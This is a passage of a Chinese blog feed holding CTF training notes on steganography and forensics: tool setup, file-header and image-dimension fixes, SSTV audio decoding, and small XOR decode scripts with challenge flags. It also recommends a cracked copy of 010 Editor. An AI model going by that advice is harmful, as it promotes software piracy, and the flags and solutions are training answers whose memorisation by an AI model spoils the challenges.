alt="1721551205280-0d468676-ce93-4c86-ad1d-4994326f8e16.png"></p><p>NSSCTF{MFC_pr0gr4mming_is_awes0m3}</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><blockquote><p>更新: 2024-10-29 22:57:14<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/agasfv65v7e2g74p">https://www.yuque.com/chaye-apqbl/vsc85q/agasfv65v7e2g74p</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/Polis/Misc%E2%80%94%E2%80%94%E5%85%A5%E9%97%A8/"/>
    <url>/2026/01/19/Polis/Misc%E2%80%94%E2%80%94%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc——入门"><a href="#Misc——入门" class="headerlink" title="Misc——入门"></a>Misc——入门</h1><p>来看这个</p><p>zMXHz3TimhDFzdfKx3LpDv9Myw5Kx2K0p30&#x3D;</p><h1 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h1><h1 id="诗人握持"><a href="#诗人握持" class="headerlink" title="诗人握持"></a>诗人握持</h1><p><img src="/./img/cupm2DyM3fO35FxM/1729784183044-31db41b5-662a-42ef-a637-89c3789af79b-481345.jpeg" alt="1729784183044-31db41b5-662a-42ef-a637-89c3789af79b.jpeg"></p><p>物是人非事事休，欲语泪先流</p><p>抽刀断水水更流，举杯消愁愁更愁</p><p>寻寻觅觅冷冷清清，凄凄惨惨戚戚</p><p>假亦真时真亦假，无为有处有还无</p><p>明日复明日，明日何其多</p><p>东风不与周郎便，铜雀春深锁二乔</p><p>鱼和熊掌，不可兼得</p><p>举头望明月，低头思故乡</p><p>先天下之忧而忧，后天下之乐而乐</p><p>欲穷千里目，更上一层楼</p><blockquote><p>更新: 2024-11-16 11:00:41<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/qxxdr5lg9dzxp1iy">https://www.yuque.com/chaye-apqbl/vsc85q/qxxdr5lg9dzxp1iy</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/Polis/2025%E6%9A%91%E5%81%87%E9%9B%86%E8%AE%AD%E2%80%94%E2%80%94MISC%E5%85%A5%E9%97%A8/"/>
    <url>/2026/01/19/Polis/2025%E6%9A%91%E5%81%87%E9%9B%86%E8%AE%AD%E2%80%94%E2%80%94MISC%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="2025暑假集训——MISC入门"><a href="#2025暑假集训——MISC入门" class="headerlink" title="2025暑假集训——MISC入门"></a>2025暑假集训——MISC入门</h1><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>misc称为杂项，就是考各种知识点，很乱很杂，但也有一些体系（如各种隐写，取证，zip，加解密，流量）</p><p>各种东西意味着我们需要很多工具，这些工具大多数都开源免费的，动动自己的搜索引擎就能下载好，我非常欢迎大家提问技术上的问题，但一些能自己解决的问题最好还是自己解决</p><p>misc主要还是考察大家的积累，需要找一些工具，题目不难只是很多很杂，而且有时候需要一些想象力，需要和出题人对脑电波</p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>提前准备。提前声明，下载东西<font style="color:#DF2A3F;">千万千万千万不要找网上那种链接下载的网站，很容易中招（到时候只能重装系统），前面有学长推荐了，下载工具去github和吾爱破解上，什么软件园千万别去，不然到时候右下角跳出传奇广告就老实了</font></p><p>010editor（破解版），stegsolve，kali，kali下foremost，zsteg，binwalk</p><p>这边建议下载kali可以下载iso镜像相当于一体机，下载好直接导入就能使用，自行安装比较麻烦但也可以，毕竟工具能使用就行</p><p>kali自行安装<a href="https://blog.csdn.net/Javachichi/article/details/134087232">https://blog.csdn.net/Javachichi/article/details/134087232</a></p><p>kali镜像安装<a href="https://blog.csdn.net/weixin_53729021/article/details/120794208">https://blog.csdn.net/weixin_53729021&#x2F;article&#x2F;details&#x2F;120794208</a></p><p>至于kali的下载命令和工具使用命令，动用你的百度即可，原本问学长的问题直接问百度不是更科学更准确吗</p><h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><p>ctfshow平台：</p><p>【misc入门】</p><ol><li>[图片篇(基础操作)]misc2</li><li>[图片篇(基础操作)]misc3</li><li>[图片篇(信息附加)]misc11</li><li>[图片篇(信息附加)]misc14</li><li>[图片篇(信息附加)]misc17</li><li>[图片篇(文件结构)]misc27</li><li>[图片篇(颜色附加)]misc50</li></ol><p>基础入门题目</p><h2 id="misc2（改后缀）"><a href="#misc2（改后缀）" class="headerlink" title="misc2（改后缀）"></a>misc2（改后缀）</h2><p><img src="/./img/LQueD8onjZAprYtA/1752893630188-188f4f93-b06f-45a4-9b7f-e522061f4853-564493.png" alt="1752893630188-188f4f93-b06f-45a4-9b7f-e522061f4853.png"></p><p>改成png后缀即可</p><p><img src="/./img/LQueD8onjZAprYtA/1752893682375-0577089d-a25d-43a5-b13d-bb4a610b5f73-933151.png" alt="1752893682375-0577089d-a25d-43a5-b13d-bb4a610b5f73.png"></p><p><img src="/./img/LQueD8onjZAprYtA/1752893664367-c9ae1293-64a1-4e3c-acb3-cd0fd6d290c9-189911.png" alt="1752893664367-c9ae1293-64a1-4e3c-acb3-cd0fd6d290c9.png"></p><h2 id="misc3（搜索）"><a href="#misc3（搜索）" class="headerlink" title="misc3（搜索）"></a>misc3（搜索）</h2><p>ctrl+f 搜索</p><p><img src="/./img/LQueD8onjZAprYtA/1752895910378-301c06ec-d3ca-40ef-a3e1-6e5d217d8648-085209.png" alt="1752895910378-301c06ec-d3ca-40ef-a3e1-6e5d217d8648.png"></p><h2 id="misc10-binwalk"><a href="#misc10-binwalk" class="headerlink" title="misc10 binwalk"></a>misc10 binwalk</h2><p>用winhex打开后搜索文件头</p><h4 id="PNG-89504E47-AE426082"><a href="#PNG-89504E47-AE426082" class="headerlink" title="PNG 89504E47 AE426082"></a>PNG 89504E47 AE426082</h4><p>没搜到没关系</p><p><img src="/./img/LQueD8onjZAprYtA/1721552601695-f99eaca6-7241-45b9-8178-a894c4a0eee0-460823.png" alt="1721552601695-f99eaca6-7241-45b9-8178-a894c4a0eee0.png"></p><p>binwalk -e misc10.png</p><p><img src="/./img/LQueD8onjZAprYtA/1721552673915-609cbb49-5669-4cf7-92e7-39f9cca2bcc5-202713.png" alt="1721552673915-609cbb49-5669-4cf7-92e7-39f9cca2bcc5.png"></p><h2 id="misc11（IDAT数据块）"><a href="#misc11（IDAT数据块）" class="headerlink" title="misc11（IDAT数据块）"></a>misc11（IDAT数据块）</h2><p>有两个数据包，两个IDAT</p><p><img src="/./img/LQueD8onjZAprYtA/1752896121062-e1bd1c1f-c3f7-4405-8a9f-0a5886d7c544-296597.png" alt="1752896121062-e1bd1c1f-c3f7-4405-8a9f-0a5886d7c544.png"></p><p>题目提示在另一个照片中，那我们要删除一个数据块，使用tweakpng</p><p><img src="/./img/LQueD8onjZAprYtA/1752896244399-46320c78-dbbe-4103-9a99-bce23739d475-642651.png" alt="1752896244399-46320c78-dbbe-4103-9a99-bce23739d475.png"></p><p>选中第一个右键删除即可</p><h2 id="misc14-flag在图片里面"><a href="#misc14-flag在图片里面" class="headerlink" title="misc14 flag在图片里面"></a>misc14 flag在图片里面</h2><h3 id="使用命令：binwalk-e-misc14-jpg-有信息显示但是没有生成分离文件夹"><a href="#使用命令：binwalk-e-misc14-jpg-有信息显示但是没有生成分离文件夹" class="headerlink" title="使用命令：binwalk -e misc14.jpg 有信息显示但是没有生成分离文件夹"></a><font style="color:rgb(33, 37, 41);">使用命令：binwalk -e misc14.jpg 有信息显示但是没有生成分离文件夹</font></h3><h3 id="使用命令：binwalk-e-misc14-jpg-D-jpeg-–run-as-root-生成分离文件夹，获得flag"><a href="#使用命令：binwalk-e-misc14-jpg-D-jpeg-–run-as-root-生成分离文件夹，获得flag" class="headerlink" title="使用命令：binwalk -e misc14.jpg -D&#x3D;jpeg –run-as&#x3D;root 生成分离文件夹，获得flag"></a><font style="color:rgb(33, 37, 41);">使用命令：binwalk -e misc14.jpg -D&#x3D;jpeg –run-as&#x3D;root 生成分离文件夹，获得flag</font></h3><ul><li><code>-e</code> 或 <code>--extract</code>：提取文件中的嵌入数据。</li><li><code>-D=jpeg</code>：指定提取 JPEG 文件。</li><li><code>--run-as=root</code>：以 root 用户身份运行 <code>binwalk</code>。</li></ul><p><font style="color:rgb(33, 37, 41);">或者010Editor中查看jpeg文件文件头FF D8，文件尾巴FF D9，自己组合复制到新的16进制文件中，保存查看。</font></p><p><img src="/./img/LQueD8onjZAprYtA/1722226740367-4fc2cde2-6f55-40e5-a749-f755e45ba6a6-669144.png" alt="1722226740367-4fc2cde2-6f55-40e5-a749-f755e45ba6a6.png"></p><p><img src="/./img/LQueD8onjZAprYtA/1722227445187-6b1853cf-1ac0-44eb-913b-c53b8526863f-026984.jpeg" alt="1722227445187-6b1853cf-1ac0-44eb-913b-c53b8526863f.jpeg"></p><h2 id="图片宽高修改"><a href="#图片宽高修改" class="headerlink" title="图片宽高修改"></a>图片宽高修改</h2><h3 id="png-第二行"><a href="#png-第二行" class="headerlink" title="png 第二行"></a>png 第二行</h3><h3 id="jpg-ffc2后面3组"><a href="#jpg-ffc2后面3组" class="headerlink" title="jpg ffc2后面3组"></a>jpg ffc2后面3组</h3><p><img src="/./img/LQueD8onjZAprYtA/1729739496204-0fcf2c16-4829-4e7e-a8b9-6213666fde82-857920.png" alt="1729739496204-0fcf2c16-4829-4e7e-a8b9-6213666fde82.png"></p><p><img src="/./img/LQueD8onjZAprYtA/1729738671828-36a4e6be-4cfb-44ec-ad94-e8993c5de042-312080.png" alt="1729738671828-36a4e6be-4cfb-44ec-ad94-e8993c5de042.png"></p><h2 id="misc27"><a href="#misc27" class="headerlink" title="misc27"></a>misc27</h2><p><img src="/./img/LQueD8onjZAprYtA/1752897248056-28af27e5-e753-498e-8e01-3364027d65e7-726952.png" alt="1752897248056-28af27e5-e753-498e-8e01-3364027d65e7.png"></p><p><img src="/./img/LQueD8onjZAprYtA/1752897232163-0b666e66-8951-4dbe-8a1d-a5869ba4f76f-587692.png" alt="1752897232163-0b666e66-8951-4dbe-8a1d-a5869ba4f76f.png"></p><p>修改word Y_image然后保存（ctrl+s）</p><p><img src="/./img/LQueD8onjZAprYtA/1752897268035-4146e124-183b-46d2-a5df-0b5703c63aa4-423384.png" alt="1752897268035-4146e124-183b-46d2-a5df-0b5703c63aa4.png"></p><h2 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h2><p>直接用zsteg看不出来，换成工具试试<img src="/./img/LQueD8onjZAprYtA/1752897429324-78665708-ed5a-4e69-ad32-1eebcc3c8a51-698890.png" alt="1752897429324-78665708-ed5a-4e69-ad32-1eebcc3c8a51.png"></p><p><img src="/./img/LQueD8onjZAprYtA/1752897512467-548c494b-49fd-457d-bfd9-aa571c7aee05-436524.png" alt="1752897512467-548c494b-49fd-457d-bfd9-aa571c7aee05.png"></p><p><img src="/./img/LQueD8onjZAprYtA/1752897528168-5fbf5491-518c-4a01-baa8-5419f74bda52-317299.png" alt="1752897528168-5fbf5491-518c-4a01-baa8-5419f74bda52.png"></p><p><img src="/./img/LQueD8onjZAprYtA/1752897541707-28671bbc-40eb-4fd8-8506-c7ff27e5a558-981214.png" alt="1752897541707-28671bbc-40eb-4fd8-8506-c7ff27e5a558.png"></p><h1 id="misc-第一轮题目"><a href="#misc-第一轮题目" class="headerlink" title="misc 第一轮题目"></a>misc 第一轮题目</h1><p>stegsolve使用教程<a href="https://blog.csdn.net/m0_75030189/article/details/136940462">https://blog.csdn.net/m0_75030189&#x2F;article&#x2F;details&#x2F;136940462</a></p><p>ctfshow平台：</p><p>【misc入门】</p><ol><li>[图片篇(基础操作)]misc3</li><li>[图片篇(信息附加)]misc5</li><li>[图片篇(信息附加)]misc17</li><li>[图片篇(文件结构)]misc24</li><li>[图片篇(颜色附加)]misc50</li></ol><p>buuctf平台：</p><ol><li>金三胖</li><li>你竟然赶我走</li></ol><p>基础入门难度不高</p><h1 id="系统学习"><a href="#系统学习" class="headerlink" title="系统学习"></a>系统学习</h1><p>以下是学习misc的系统内容，遇到什么就学什么，边刷题边学习，祝师傅们在集训收获满满</p><p>基础篇：</p><p>隐写：图片隐写，音频隐写，pyc隐写，f5隐写，txt隐写（snow加密）</p><p>压缩包：伪加密，crc爆破，套娃爆破，密钥爆破，明文攻击，zlib解压</p><p>编码：base编码，rot编码，ook，Cimbar等，很多</p><p>流量分析：wireshark的使用，usb流量，哥斯拉，wifi流量</p><p>修复：二维码修复，照片宽高修复，zip修复</p><p>取证：内存取证，磁盘取证</p><p>进阶篇：</p><p>jail沙盒逃逸</p><blockquote><p>更新: 2025-07-19 14:03:21<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/td9esmacqxgr5pkg">https://www.yuque.com/chaye-apqbl/vsc85q/td9esmacqxgr5pkg</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/Polis/2025%E4%B8%8A%E5%BC%80%E6%94%BE%E5%AE%9E%E9%AA%8Cwp/"/>
    <url>/2026/01/19/Polis/2025%E4%B8%8A%E5%BC%80%E6%94%BE%E5%AE%9E%E9%AA%8Cwp/</url>
    
    <content type="html"><![CDATA[<h1 id="2025上开放实验wp"><a href="#2025上开放实验wp" class="headerlink" title="2025上开放实验wp"></a>2025上开放实验wp</h1><h2 id="ez流量"><a href="#ez流量" class="headerlink" title="ez流量"></a>ez流量</h2><h3 id="flag1-初"><a href="#flag1-初" class="headerlink" title="flag1(初)"></a>flag1(初)</h3><p><img src="/./img/jz2tRZU3q5EsUyz-/1743412191640-4012e2d0-7a49-4cad-81a8-c0b20d8bedd4-310437.png" alt="1743412191640-4012e2d0-7a49-4cad-81a8-c0b20d8bedd4.png"></p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743412450840-93d41384-fde0-432c-a24e-8a717f3dc02d-859040.png" alt="1743412450840-93d41384-fde0-432c-a24e-8a717f3dc02d.png"></p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743412797350-6799dcf8-58b1-4c15-8782-1c9c41f2b18e-539967.png" alt="1743412797350-6799dcf8-58b1-4c15-8782-1c9c41f2b18e.png"></p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743412850482-89141944-7b3c-4af9-94da-69d8e0da39d2-293016.png" alt="1743412850482-89141944-7b3c-4af9-94da-69d8e0da39d2.png"></p><p>头89 00 00 00 </p><p>尾5a 41 3d 3d（这里是加上base64的结尾）</p><p>正常尾部为4e 42 60 82</p><p>导出数据流放到010里面分离</p><p>设置头尾导出即可</p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743413287503-609b4633-2872-4d29-8b46-87a5ecfe0051-739695.png" alt="1743413287503-609b4633-2872-4d29-8b46-87a5ecfe0051.png"></p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743413528939-2375bddf-c58e-470e-b46c-cc3ee13dfa21-010861.png" alt="1743413528939-2375bddf-c58e-470e-b46c-cc3ee13dfa21.png"></p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743413760387-44bffc8b-eade-4989-a799-d423940ec282-251177.png" alt="1743413760387-44bffc8b-eade-4989-a799-d423940ec282.png"></p><p>改完文件头和后缀发现照片太小了</p><p>去改宽高</p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743413960221-74f15c24-380a-4cb5-a855-50a138f7dbe0-433705.png" alt="1743413960221-74f15c24-380a-4cb5-a855-50a138f7dbe0.png"></p><p>原本的宽值为:0000019a</p><p>原本的高值为:0000aaaa</p><p>改回png拿到flag1</p><p>因为网站报错所以扫出来404，后修改flag01</p><h3 id="flag1-改后"><a href="#flag1-改后" class="headerlink" title="flag1(改后)"></a>flag1(改后)</h3><p>hint：神秘的数字</p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743417812992-fca8fdf2-abf4-4eae-8d94-53dc3967d06f-008983.png" alt="1743417812992-fca8fdf2-abf4-4eae-8d94-53dc3967d06f.png"></p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743417857735-933ec8d8-9934-4193-8b43-ff64112faf21-114131.png" alt="1743417857735-933ec8d8-9934-4193-8b43-ff64112faf21.png"></p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743417918037-4fced4cd-17b7-45c9-bc0b-f4bd35d9981f-623854.png" alt="1743417918037-4fced4cd-17b7-45c9-bc0b-f4bd35d9981f.png"></p><p>扫码得到flag1</p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>注意提取的文件数据不要缺失</p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743418008242-e87f4958-f78e-4744-9527-f3e3ed511eb5-221656.png" alt="1743418008242-e87f4958-f78e-4744-9527-f3e3ed511eb5.png"></p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743418098393-96128c68-93a0-4e90-9f32-899c63cad9ea-645507.png" alt="1743418098393-96128c68-93a0-4e90-9f32-899c63cad9ea.png"></p><p>改成08就解密出来了</p><p><img src="/./img/jz2tRZU3q5EsUyz-/1743418167069-ff9aed54-117e-43a6-8466-128130ee5426-547813.png" alt="1743418167069-ff9aed54-117e-43a6-8466-128130ee5426.png"></p><p>拿到flag2</p><blockquote><p>更新: 2025-03-31 18:49:53<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/snxx0zovc62r9m19">https://www.yuque.com/chaye-apqbl/vsc85q/snxx0zovc62r9m19</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/Polis/2024%E4%B8%8A%E5%BC%80%E6%94%BE%E5%AE%9E%E9%AA%8Cwp/"/>
    <url>/2026/01/19/Polis/2024%E4%B8%8A%E5%BC%80%E6%94%BE%E5%AE%9E%E9%AA%8Cwp/</url>
    
    <content type="html"><![CDATA[<h1 id="2024上开放实验wp"><a href="#2024上开放实验wp" class="headerlink" title="2024上开放实验wp"></a>2024上开放实验wp</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p><img src="/./img/XUJ-xBImeKv_mHSE/1730783640865-21b40975-7e73-4d00-b472-4ad0c335f414-532420.png" alt="1730783640865-21b40975-7e73-4d00-b472-4ad0c335f414.png"></p><h2 id="1919810-zip"><a href="#1919810-zip" class="headerlink" title="1919810.zip"></a><font style="color:rgb(33, 37, 41);">1919810.zip</font></h2><p>真加密爆破</p><p><img src="/./img/XUJ-xBImeKv_mHSE/1730967762948-e5d331a4-96e6-47b1-813a-f6b22860975a-417665.png" alt="1730967762948-e5d331a4-96e6-47b1-813a-f6b22860975a.png"></p><p><img src="/./img/XUJ-xBImeKv_mHSE/1730967846893-8178f8ef-18ad-4837-8076-58d068a94a1f-510510.png" alt="1730967846893-8178f8ef-18ad-4837-8076-58d068a94a1f.png"></p><p>合成照片 montage *.png -tile 5x5 -geometry +0+0 output.png</p><p><img src="/./img/XUJ-xBImeKv_mHSE/1730973922240-801c82df-1cba-410b-a7b4-44b0d1e22931-845308.png" alt="1730973922240-801c82df-1cba-410b-a7b4-44b0d1e22931.png"></p><p><img src="/./img/XUJ-xBImeKv_mHSE/1731398165194-62d94559-ff39-4b1a-9efb-d821966f4486-937063.png" alt="1731398165194-62d94559-ff39-4b1a-9efb-d821966f4486.png"></p><p>gaps run output.png flag.png –generations&#x3D;20 –population&#x3D;100 –size&#x3D;95</p><p><img src="/./img/XUJ-xBImeKv_mHSE/1731392454669-c8700caa-f524-445d-ad06-63db0aa7686a-155017.png" alt="1731392454669-c8700caa-f524-445d-ad06-63db0aa7686a.png"></p><p>注意使用之前添加环境变量就行</p><p><img src="/./img/XUJ-xBImeKv_mHSE/1731397898691-f02ae6a1-441f-48c5-9ae2-066aea018afb-234113.png" alt="1731397898691-f02ae6a1-441f-48c5-9ae2-066aea018afb.png"></p><p><img src="/./img/XUJ-xBImeKv_mHSE/1731398242848-391ec050-de59-4c76-9eb0-29b30df14079-464651.png" alt="1731398242848-391ec050-de59-4c76-9eb0-29b30df14079.png"></p><p>ZmxhZ3tuaXNoaXBpbmdkZWhhaXNoaWppYW9iZW5ib3khfQ&#x3D;&#x3D;</p><p><img src="/./img/XUJ-xBImeKv_mHSE/1731398453512-ee0e7176-9465-40f7-b05d-056c69510001-141134.png" alt="1731398453512-ee0e7176-9465-40f7-b05d-056c69510001.png"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p><img src="/./img/XUJ-xBImeKv_mHSE/1730783748114-fa81e454-3d9c-4aab-8bf3-034f135d9eef-966090.png" alt="1730783748114-fa81e454-3d9c-4aab-8bf3-034f135d9eef.png"></p><h1 id=""><a href="#" class="headerlink" title=""></a><img src="/./img/XUJ-xBImeKv_mHSE/1730783769606-399d776d-f505-4e26-923e-f9099c181d21-978150.png" alt="1730783769606-399d776d-f505-4e26-923e-f9099c181d21.png"></h1><h2 id="Easy-p1th0y"><a href="#Easy-p1th0y" class="headerlink" title="Easy_p1th0y"></a><font style="color:rgb(33, 37, 41);">Easy_p1th0y</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag=&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;<br>result=[6, 12, 1, 7, 27, 48, 82, 20, 8, 81, 20, 63, 81, 19, 63, 54, 5, 83, 25, 63, 37, 81, 19, 25, 63, 18, 81, 7, 8, 20, 95, 29]<br>key=0x60<br>for i in range(len(flag)):<br>    result[i]=flag[i]^key<br>print(result,end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">result=[6, 12, 1, 7, 27, 48, 82, 20, 8, 81, 20, 63, 81, 19, 63, 54, 5, 83, 25, 63, 37, 81, 19, 25, 63, 18, 81, 7, 8, 20, 95, 29]<br>key=0x60<br>for i in range(len(result)):<br>    result[i]=result[i]^key<br>    print(chr(result[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="S1gn-ln"><a href="#S1gn-ln" class="headerlink" title="S1gn_ln"></a><font style="color:rgb(33, 37, 41);">S1gn_ln</font></h2><h1 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/./img/XUJ-xBImeKv_mHSE/1730784082874-08f600be-4653-4a40-88d0-9fed254a2c23-050539.png" alt="1730784082874-08f600be-4653-4a40-88d0-9fed254a2c23.png"></h1><h2 id="easy-x0r"><a href="#easy-x0r" class="headerlink" title="easy_x0r"></a><font style="color:rgb(33, 37, 41);">easy_x0r</font></h2><h1 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="/./img/XUJ-xBImeKv_mHSE/1730784249192-92371221-decf-4aa8-92cd-101c0fb8dc78-027610.png" alt="1730784249192-92371221-decf-4aa8-92cd-101c0fb8dc78.png"></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=&#x27;j`mkwIm=uST&lt;~SdmD=q&#x27;<br>key=12<br>for i in range(len(a)):<br>    print(chr(ord(a[i])^12),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><p>Crypto</p><blockquote><p>更新: 2024-11-12 16:01:59<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/vi8ar9wep8vy79l8">https://www.yuque.com/chaye-apqbl/vsc85q/vi8ar9wep8vy79l8</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/RXSSTV/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/RXSSTV/</url>
    
    <content type="html"><![CDATA[<h1 id="RXSSTV"><a href="#RXSSTV" class="headerlink" title="RXSSTV"></a>RXSSTV</h1><h1 id="https-www-cnblogs-com-wutou-p-16154582-html"><a href="#https-www-cnblogs-com-wutou-p-16154582-html" class="headerlink" title="https://www.cnblogs.com/wutou/p/16154582.html"></a><a href="https://www.cnblogs.com/wutou/p/16154582.html">https://www.cnblogs.com/wutou/p/16154582.html</a></h1><p><a href="https://blog.csdn.net/orchid_sea/article/details/138075312">https://blog.csdn.net/orchid_sea&#x2F;article&#x2F;details&#x2F;138075312</a></p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p><img src="/./img/oqHYjwrGWePVJ40v/1731826666927-b5e28c13-ea86-463f-8e48-b5b02e8ea3ad-550941.png" alt="1731826666927-b5e28c13-ea86-463f-8e48-b5b02e8ea3ad.png"></p><p><img src="/./img/oqHYjwrGWePVJ40v/1731826948387-d8c622e5-7cc4-4688-84c5-0d1d75dfbcfa-881492.png" alt="1731826948387-d8c622e5-7cc4-4688-84c5-0d1d75dfbcfa.png"></p><p><font style="color:rgb(77, 77, 77);">将输出的图片设置为100%</font></p><p><img src="/./img/oqHYjwrGWePVJ40v/1731827031300-db6460f6-97ea-4af9-b757-d798f9693476-445298.png" alt="1731827031300-db6460f6-97ea-4af9-b757-d798f9693476.png"></p><p><img src="/./img/oqHYjwrGWePVJ40v/1731827037588-465b0e11-fa1c-4f00-a1a2-a3448e433f90-760738.png" alt="1731827037588-465b0e11-fa1c-4f00-a1a2-a3448e433f90.png"></p><p><font style="color:rgb(77, 77, 77);">SSTV-Engine里RX保持默认设置</font></p><p><img src="/./img/oqHYjwrGWePVJ40v/1731827051622-d9f4340f-005d-4253-aa5e-b807a3b23203-694038.png" alt="1731827051622-d9f4340f-005d-4253-aa5e-b807a3b23203.png"></p><p><font style="color:rgb(77, 77, 77);">将AFC、LMS、BPF全都选上</font></p><h1 id="解码"><a href="#解码" class="headerlink" title="解码"></a><font style="color:rgb(79, 79, 79);">解码</font></h1><p><img src="/./img/oqHYjwrGWePVJ40v/1731827076551-230861f2-1cf1-48ef-9c9c-f35996ac5335-092286.png" alt="1731827076551-230861f2-1cf1-48ef-9c9c-f35996ac5335.png"></p><h1 id="例题RX"><a href="#例题RX" class="headerlink" title="例题RX"></a>例题RX</h1><h2 id="SYC"><a href="#SYC" class="headerlink" title="SYC"></a>SYC</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2024/wav/42988179/1731826212774-20295749-e830-4d10-aec9-7f94480c05a1.wav">sunset.wav</a></p><p><img src="/./img/oqHYjwrGWePVJ40v/1731827198692-23f6d732-4287-4803-afe9-87852056fa8a-305086.png" alt="1731827198692-23f6d732-4287-4803-afe9-87852056fa8a.png"></p><p>得到密码Be4uti7ulSun5e7</p><p><img src="/./img/oqHYjwrGWePVJ40v/1731828837056-3c43c23d-e2e8-4c46-aada-551d44cc86db-518823.png" alt="1731828837056-3c43c23d-e2e8-4c46-aada-551d44cc86db.png"></p><p><img src="/./img/oqHYjwrGWePVJ40v/1731828972818-0f723f40-2b2c-4b8d-9789-c954806dcfb4-312985.png" alt="1731828972818-0f723f40-2b2c-4b8d-9789-c954806dcfb4.png"></p><p>是logo语言</p><p><a href="https://www.calormen.com/jslogo/">https://www.calormen.com/jslogo/</a></p><p><img src="/./img/oqHYjwrGWePVJ40v/1731829369239-2478770c-2d97-48c4-97c9-447c6d3d8cf9-630466.png" alt="1731829369239-2478770c-2d97-48c4-97c9-447c6d3d8cf9.png"></p><p><img src="/./img/oqHYjwrGWePVJ40v/1731829404007-f48dc251-dc33-47c1-bffd-a9050eb04a7c-326794.png" alt="1731829404007-f48dc251-dc33-47c1-bffd-a9050eb04a7c.png"></p><blockquote><p>更新: 2024-11-17 15:43:32<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/lcct7f6mpabflxe2">https://www.yuque.com/chaye-apqbl/vsc85q/lcct7f6mpabflxe2</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/outguess/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/outguess/</url>
    
